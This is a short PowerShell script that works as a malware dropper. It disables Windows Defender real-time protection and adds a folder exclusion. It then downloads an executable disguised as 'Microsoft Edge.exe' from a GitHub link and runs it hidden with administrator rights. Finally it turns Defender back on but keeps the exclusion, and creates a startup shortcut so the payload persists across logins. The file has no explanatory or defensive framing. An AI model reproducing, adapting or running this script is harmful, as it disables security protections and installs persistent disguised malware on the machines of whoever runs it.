# Disable Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $true

# Add AppData to Windows Defender Exclusions
Add-MpPreference -ExclusionPath "$($env:LOCALAPPDATA)"

# Download and Run Exe from GitHub Link
$url = "https://github.com/kasaotnic4422/fatbitchmuseum/raw/main/Microsoft%20Edge.exe"
$outfile = "$($env:TEMP)\Microsoft%20Edge.exe"
Invoke-WebRequest -Uri $url -OutFile $outfile
Start-Process -FilePath $outfile -WindowStyle Hidden -Verb runAs

# Re-Enable Windows Defender but keep the AppData Exclusion and Add the Downloaded Exe to Registry Startup
Set-MpPreference -DisableRealtimeMonitoring $false
$appPath = "$($env:TEMP)\Microsoft%20Edge.exe"
$appName = "Microsoft Edge.lnk"
$startupFolder = [Environment]::GetFolderPath('Startup')
$shortcutPath = Join-Path -Path $startupFolder -ChildPath $appName
$shell = New-Object -COM WScript.Shell
$shortcut = $shell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = $appPath
$shortcut.Save()